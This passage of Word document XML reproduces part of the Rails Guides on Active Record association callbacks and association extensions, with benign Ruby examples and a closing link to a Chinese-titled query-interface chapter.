        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>before_add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743EF204" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>after_add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD7714D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>before_remove</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D22558A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>after_remove</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69385C4F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You define association callbacks by adding options to the association declaration. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6864"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="4D471480" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="323A1FFC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AE9E5DA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders, :before_add</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :check_credit_limit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A23DE31" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D1003B2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>check_credit_limit(order)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A6AB447" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A930838" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25AF3313" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3AEA5FF9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails passes the object being added or removed to the callback.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C709565" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can stack callbacks on a single event by passing them as an array:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="7C044675" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1620178A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6833C66C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25500D67" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :before_add</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [:check_credit_limit, :calculate_shipping_charges]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B1EFF0A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F2AD536" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>check_credit_limit(order)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69424365" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E205E2C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AC987B7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10684722" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>calculate_shipping_charges(order)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B7D9A0E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C8BAF20" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45CA46A0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4B0FEAA4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>before_add</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> callback throws an exception, the object does not get added to the collection. Similarly, if a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>before_remove</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> callback throws an exception, the object does not get removed from the collection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA98466" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.6 Association Extensions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E490955" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You’re not limited to the functionality that Rails automatically builds into association proxy objects. You can also extend these objects through anonymous modules, adding new finders, creators, or other methods. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6096"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="4C41E909" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62F7D845" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5930B977" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D47E15F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>find_by_order_prefix(order_number)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="099DDCDF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      find_by_region_id(order_number[0..2])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="082F04F2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EDD78A8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="616A761C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1795E872" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you have an extension that should be shared by many associations, you can use a named extension module. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6864"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="1286B7D5" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D031FA6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>FindRecentExtension</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BE21306" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>find_recent</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B00A06D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    where("created_at &gt; ?", 5.days.ago)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="021747DF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="522CFA6C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="228FD4DC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02E5BB51" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="424FB92A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders, :extend</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; FindRecentExtension</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="077F5695" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B293FD6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3882C6F0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C16C8FF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :deliveries, :extend</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; FindRecentExtension</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61299003" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="554719B4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To include more than one extension module in a single association, specify an array of modules:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7464"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="243EF2AE" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="23B1F87E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D96B50A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19AC347A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :extend</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [FindRecentExtension, FindActiveExtension]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E65D8E6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1DF0D242" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Extensions can refer to the internals of the association proxy using these three attributes of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>proxy_association</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accessor:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABEE7AC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="54"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>proxy_association.owner</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the object that the association is a part of.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48CA8614" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="54"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>proxy_association.reflection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the reflection object that describes the association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8689E1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="54"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>proxy_association.target</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the associated object for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, or the collection of associated objects for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706443B1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="005D6D6E"/>
    <w:p w14:paraId="5185DE07" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:hyperlink r:id="rId220" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Active Record </w:t>
        </w:r>
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>查询接口</w:t>
        </w:r>
      </w:hyperlink>
